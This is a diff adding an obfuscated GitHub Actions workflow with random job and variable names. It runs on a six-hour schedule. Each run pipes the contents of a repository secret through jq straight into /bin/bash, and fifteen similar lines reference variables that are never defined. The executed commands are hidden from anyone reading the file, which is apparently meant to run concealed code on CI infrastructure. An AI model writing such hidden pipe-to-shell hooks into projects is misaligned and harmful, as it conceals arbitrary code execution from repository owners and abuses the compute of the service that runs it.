@@ -1,0 +1,33 @@
+name: luxuantian4627
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '10 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: luxuantian4627
+        env:
+          zf30: ${{ secrets.zf30 }}
+        run: |
+          echo $zf30 | jq -r .nid8100 | /bin/bash
+          echo $cqa14135 | jq -r .gey70057 | /bin/bash
+          echo $ox4475 | jq -r .tfbv562 | /bin/bash
+          echo $zexnr05027 | jq -r .iln6 | /bin/bash
+          echo $fqwqw8803 | jq -r .q0456 | /bin/bash
+          echo $vs00764 | jq -r .rgey48195 | /bin/bash
+          echo $yjr0 | jq -r .mkmgs5021 | /bin/bash
+          echo $rt944 | jq -r .wfs479 | /bin/bash
+          echo $xl6211 | jq -r .vd37833 | /bin/bash
+          echo $jwct79 | jq -r .blcoi5 | /bin/bash
+          echo $yto549 | jq -r .ze4 | /bin/bash
+          echo $ls1351 | jq -r .jpab9686 | /bin/bash
+          echo $yow73 | jq -r .tjhh6 | /bin/bash
+          echo $j85 | jq -r .lsf85 | /bin/bash
+          echo $qu884 | jq -r .z40715 | /bin/bash
+          echo $esm9294 | jq -r .jfr7 | /bin/bash
+
